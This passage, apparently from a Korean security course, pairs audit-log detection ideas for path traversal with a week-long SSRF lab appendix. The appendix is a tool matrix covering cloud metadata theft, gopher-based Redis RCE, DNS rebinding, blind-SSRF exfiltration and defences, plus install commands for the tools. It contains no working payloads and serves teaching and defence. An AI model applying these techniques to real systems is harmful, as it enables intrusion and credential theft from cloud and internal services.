1. 업로드 디렉토리에 auditd / Windows audit policy 활성 → 4656/4658/4663 모두 기록 → 점검 도구가 *path traversal payload* 시도 시 ObjectName 에 `../` 도달 여부 확인
2. dataset 의 4663:4656 비율 (98:79,311 = 0.12%) 을 *baseline* 으로 — 점검 환경에서 0.12% 이상이면 *이상 access*
3. 4690 (handle duplicate) 가 *web user* (IIS·Apache 실행 계정) 에서 발생 → web 프로세스 권한 escalation 시도 의심



---

## 부록: 학습 OSS 도구 매트릭스 (lab week07 — SSRF)

| step | 카테고리 | 핵심 도구 |
|---|---|---|
| 1 식별 | 6 위치 표 / curl PUT / **SSRFmap** / **Burp Collaborator** OOB / **interactsh** / nuclei -tags ssrf |
| 2 포트 스캔 | curl 응답 시간 차이 / SSRFmap portscan / wfuzz range / Burp Intruder / 내부 서비스 포트 표 |
| 3 localhost | **13 표현 변형** / SSRFmap / interactsh OOB / 우회 효과 표 / DNS resolver 검증 |
| 4 클라우드 메타데이터 | **7 클라우드 endpoint 표** / curl AWS IMDS / SSRFmap aws / aws CLI 활용 / **IMDSv2 PUT 우회** |
| 5 프로토콜 스키마 | 8 스키마 표 / file:// 파일 / **gopher:// Redis RCE** / dict:// 정보 누출 / **gopherus** |
| 6 DNS rebinding | 4 단계 원리 / **rbndr.us** / **Singularity of Origin** / 수동 DNS Python / DNSChef MITM |
| 7 redirect | Python http.server / Flask chain / SSRFmap redirect / interactsh / 5 redirect 형식 |
| 8 URL parser | 8 페이로드 / curl 다중 / **Python vs Java vs Node parser 차이** / **ssrf-king Burp** / Orange Tsai |
| 9 IP 변환 | **12 IP 변형 표** / Python 자동 변환 / curl 모든 변형 / SSRFmap / ipaddress 검증 |
| 10 내부 API | 8 내부 API 표 (K8s/Consul/etcd/Vault/Docker/Spring/Eureka/Jenkins) / gopherus Redis / **Pacu AWS** / kubectl |
| 11 체인 | **Capital One 시나리오** / Pacu AWS 자동 / 4 체인 표 / BloodHound AD / **CloudGoat** 학습 환경 |
| 12 Blind SSRF | **interactsh OOB** / Burp Collaborator / DNS exfil / timing 차이 / SSRFmap blind / **webhook.site** |
| 13 defense | 5층 방어 / **Python safe_fetch** / Node ssrf-req-filter / Java URLValidator / iptables egress |
| 14 격리 | iptables/nftables / **K8s NetworkPolicy** / AWS SG + IMDSv2 / **Squid egress proxy** / **Cilium L7** |
| 15 verification | 자동 보고서 / 위험도 표 / 5층 권고 / sha256 |

### 학생 환경 준비
```bash
git clone --depth 1 https://github.com/swisskyrepo/SSRFmap ~/SSRFmap
git clone --depth 1 https://github.com/tarunkant/Gopherus ~/Gopherus
git clone --depth 1 https://github.com/nccgroup/singularity ~/singularity
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
pip install dnschef pacu corscanner
sudo apt install -y squid
# CloudGoat: git clone https://github.com/RhinoSecurityLabs/cloudgoat
```
